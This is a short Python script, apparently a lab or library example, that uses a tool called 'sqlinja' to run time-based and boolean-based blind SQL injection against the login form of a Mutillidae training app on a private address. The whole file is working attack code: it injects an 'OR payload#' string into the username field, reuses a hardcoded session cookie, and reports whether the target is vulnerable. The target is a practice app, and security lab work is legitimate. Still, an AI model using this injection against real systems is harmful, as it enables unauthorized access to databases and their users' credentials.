#!/bin/python

import requests
from sqlinja import MySqlConfig, SqlInja
import sys

# config
# request execution
def exec_request_base(payload: str) -> requests.Response:
    cookies = dict(showhints='0',PHPSESSID='408ecb703b7f0234422052d468ea6fc7')
    url = "http://10.100.0.136/mutillidae/index.php?page=login.php"
    datas = {
        'username': f"test' OR {payload}#",
        'password': "pass",
        'login-php-submit-button': "Login",
    }
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    #sys.stdout.write(f"[PAYLOAD] {payload} : {result}")
    return requests.post(url, data=datas, headers=headers, allow_redirects=False, cookies=cookies)

def exec_request_time(payload: str, sleep_duration : int) -> bool:
    res = exec_request_base(payload)
    return res.elapsed.seconds >= sleep_duration

def exec_request_bool(payload: str, sleep_duration : int) -> bool:
    res = exec_request_base(payload)
    return res.status_code == 302

# Method 1 : check for the current request
helper = SqlInja(MySqlConfig(), exec_request_time, MySqlConfig.payload_int_time)
helper.prepare_new()
rq = "SELECT username FROM accounts ORDER BY username LIMIT 1,1"
if(helper.check(rq)):
    sys.stdout.write("Target is Vulnerable\n")
else:
    sys.stdout.write("Target is not Vulnerable\n")

# if the request is invalid, the check fail
rq = "SELECT username FROM invalid_table ORDER BY username LIMIT 1,1"
if(helper.check(rq)):
    sys.stdout.write("Target is Vulnerable\n")
else:
    sys.stdout.write("Target is not Vulnerable\n")

# Method 2 : generic check
# time based
helper = SqlInja(MySqlConfig(), exec_request_time, MySqlConfig.payload_int_time)
if(helper.check("SELECT 1")):
    sys.stdout.write("Target is Vulnerable\n")
else:
    sys.stdout.write("Target is not Vulnerable\n")

# boolean based
helper = SqlInja(MySqlConfig(), exec_request_bool, MySqlConfig.payload_int_bool)
if(helper.check("SELECT 1")):
    sys.stdout.write("Target is Vulnerable\n")
else:
    sys.stdout.write("Target is not Vulnerable\n")
